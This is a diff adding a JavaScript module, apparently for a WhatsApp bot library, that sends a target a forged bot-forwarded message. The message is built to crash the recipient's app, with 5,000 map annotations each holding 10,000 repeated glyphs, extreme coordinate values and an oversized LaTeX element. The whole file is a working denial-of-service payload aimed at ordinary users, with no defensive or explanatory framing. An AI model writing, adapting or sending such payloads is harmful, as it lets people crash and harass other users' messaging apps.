@@ -1,0 +1,55 @@
+module.exports = async function(sock, target) {
+    if (!sock || !target) {
+        throw new Error("Missing sock or target");
+    }
+
+    await sock.relayMessage(target, {
+  botForwardedMessage: {
+   message: {
+    richResponseMessage: {
+     mapMetadata: {
+      centerLatitude: 99999e10,
+      centerLongitude: -99999e10,
+      latitudeDelta: 99999e99,
+      longitudeDelta: 99999e99,
+      showInfoList: true,
+      annotations: Array.from({ length: 5000 }, (_, i) => ({
+       annotationNumber: i,
+       latitude: 99999e10,
+       longitude: -99999e10,
+       title: "ꦽ".repeat(10000),
+       body: "ꦽ".repeat(10000)
+      }))
+     },
+     messageType: 1,
+     submessages: [
+      {
+       messageType: 8,
+       latexMetadata: {
+        text: "CHIKU CHIKU",
+        expressions: [
+         {
+          latexExpression: "CHIKU CHIKU",
+          url: "https://t.me/Nxraaaaaaa",
+          height: 99999999,
+          fontHeight: 1,
+         },
+        ],
+       },
+      },
+     ],
+     contextInfo: {
+      forwardingScore: 99999,
+      isForwarded: true,
+      forwardedAiBotMessageInfo: {
+       botJid: "0@bot",
+      },
+      forwardOrigin: 4,
+     },
+    },
+   },
+  },
+ }, { noSelfSync: true });
+
+    return { ok: true };
+};
